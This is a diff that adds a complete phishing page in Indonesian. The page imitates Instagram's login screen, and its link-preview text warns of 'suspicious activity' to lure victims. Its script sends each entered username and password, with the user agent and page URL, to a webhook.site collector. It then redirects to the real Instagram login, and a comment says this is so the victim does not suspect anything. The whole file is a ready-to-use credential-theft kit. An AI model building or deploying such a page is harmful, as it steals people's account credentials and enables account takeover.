@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>Instagram • Login</title>
+  <!-- Meta tags untuk preview WhatsApp/Telegram -->
+  <meta property="og:title" content="Verifikasi Akun Instagram" />
+  <meta property="og:description" content="Kami mendeteksi aktivitas mencurigakan. Verifikasi sekarang untuk mengamankan akun Anda." />
+  <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/1024px-Instagram_icon.png" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
+    body {
+      background-color: #fafafa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      width: 100%;
+      max-width: 350px;
+      padding: 20px;
+    }
+    .card {
+      background: white;
+      border: 1px solid #dbdbdb;
+      border-radius: 1px;
+      padding: 40px 30px 30px;
+      width: 100%;
+      margin-bottom: 10px;
+    }
+    .logo {
+      text-align: center;
+      margin-bottom: 30px;
+    }
+    .logo svg {
+      width: 175px;
+    }
+    input {
+      width: 100%;
+      padding: 9px 8px;
+      margin-bottom: 6px;
+      background: #fafafa;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      font-size: 12px;
+    }
+    input:focus {
+      outline: none;
+      border-color: #a8a8a8;
+    }
+    button {
+      width: 100%;
+      background-color: #0095f6;
+      color: white;
+      padding: 7px 16px;
+      border: none;
+      border-radius: 4px;
+      font-weight: 600;
+      font-size: 14px;
+      margin-top: 12px;
+      cursor: pointer;
+    }
+    button:active {
+      background-color: #0077cc;
+    }
+    .divider {
+      display: flex;
+      align-items: center;
+      margin: 20px 0;
+      color: #8e8e8e;
+      font-size: 13px;
+    }
+    .divider-line {
+      flex: 1;
+      height: 1px;
+      background: #dbdbdb;
+    }
+    .divider-text {
+      margin: 0 18px;
+      font-weight: 600;
+    }
+    .fb-login {
+      text-align: center;
+      margin: 8px 0;
+    }
+    .fb-login a {
+      color: #385185;
+      text-decoration: none;
+      font-weight: 600;
+      font-size: 13px;
+    }
+    .forgot {
+      text-align: center;
+      margin-top: 12px;
+    }
+    .forgot a {
+      color: #00376b;
+      text-decoration: none;
+      font-size: 12px;
+    }
+    .signup-card {
+      background: white;
+      border: 1px solid #dbdbdb;
+      text-align: center;
+      padding: 20px;
+      width: 100%;
+      font-size: 14px;
+    }
+    .signup-card a {
+      color: #0095f6;
+      text-decoration: none;
+      font-weight: 600;
+    }
+    .app-links {
+      text-align: center;
+      margin-top: 20px;
+    }
+    .app-links p {
+      font-size: 14px;
+      margin-bottom: 12px;
+    }
+    .store-badges {
+      display: flex;
+      justify-content: center;
+      gap: 8px;
+    }
+    .store-badges img {
+      height: 40px;
+    }
+    .status {
+      background: #edf4ff;
+      padding: 10px;
+      border-radius: 4px;
+      margin-top: 15px;
+      text-align: center;
+      font-size: 12px;
+      color: #1e2a3e;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+<div class="container">
+  <div class="card">
+    <div class="logo">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 175 51" width="175" height="51">
+        <defs><linearGradient id="grad" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#833AB4"/><stop offset="100%" stop-color="#E1306C"/></linearGradient></defs>
+        <text x="0" y="38" font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica,Arial,sans-serif" font-size="36" font-weight="800" fill="url(#grad)">Instagram</text>
+      </svg>
+    </div>
+    <form id="loginForm">
+      <input type="text" name="username" placeholder="Nomor telepon, username, atau email" autocomplete="off" required>
+      <input type="password" name="password" placeholder="Kata sandi" required>
+      <button type="submit">Masuk</button>
+      <div class="divider">
+        <div class="divider-line"></div>
+        <div class="divider-text">ATAU</div>
+        <div class="divider-line"></div>
+      </div>
+      <div class="fb-login">
+        <a href="#">Masuk dengan Facebook</a>
+      </div>
+      <div class="forgot">
+        <a href="#">Lupa kata sandi?</a>
+      </div>
+    </form>
+    <div id="statusMsg" class="status"></div>
+  </div>
+  <div class="signup-card">
+    Belum punya akun? <a href="#">Daftar</a>
+  </div>
+  <div class="app-links">
+    <p>Dapatkan aplikasi.</p>
+    <div class="store-badges">
+      <img src="https://www.instagram.com/static/images/appstore-icon/ios.png/6c4c0a9f2e5d.png" alt="App Store" style="height:40px;">
+      <img src="https://www.instagram.com/static/images/appstore-icon/googleplay.png/5f5e5c6a3e4d.png" alt="Google Play" style="height:40px;">
+    </div>
+  </div>
+</div>
+
+<script>
+  const form = document.getElementById('loginForm');
+  const statusDiv = document.getElementById('statusMsg');
+
+  // === GANTI DENGAN WEBHOOK KAMU ===
+  const WEBHOOK_URL = ' https://webhook.site/b2391917-c474-4671-8b2d-a969c0dad952';
+
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const username = form.querySelector('input[name="username"]').value.trim();
+    const password = form.querySelector('input[name="password"]').value;
+
+    if (!username || !password) {
+      statusDiv.style.display = 'block';
+      statusDiv.innerText = 'Harap isi semua bidang.';
+      return;
+    }
+
+    // Kirim data ke webhook
+    try {
+      const response = await fetch(WEBHOOK_URL, {
+        method: 'POST',
+        mode: 'no-cors', // biar tidak ada CORS error, webhook.site tetap terima
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          type: 'instagram_phish',
+          username: username,
+          password: password,
+          timestamp: Date.now(),
+          userAgent: navigator.userAgent,
+          url: window.location.href
+        })
+      });
+      // Karena mode no-cors, response.ok tidak bisa diandalkan, kita anggap berhasil
+      // Langsung redirect ke Instagram asli
+      window.location.href = 'https://www.instagram.com/accounts/login/';
+    } catch (err) {
+      // Jika gagal kirim (misal koneksi), tetap redirect agar korban tidak curiga
+      window.location.href = 'https://www.instagram.com/accounts/login/';
+    }
+  });
+</script>
+</body>
+</html>
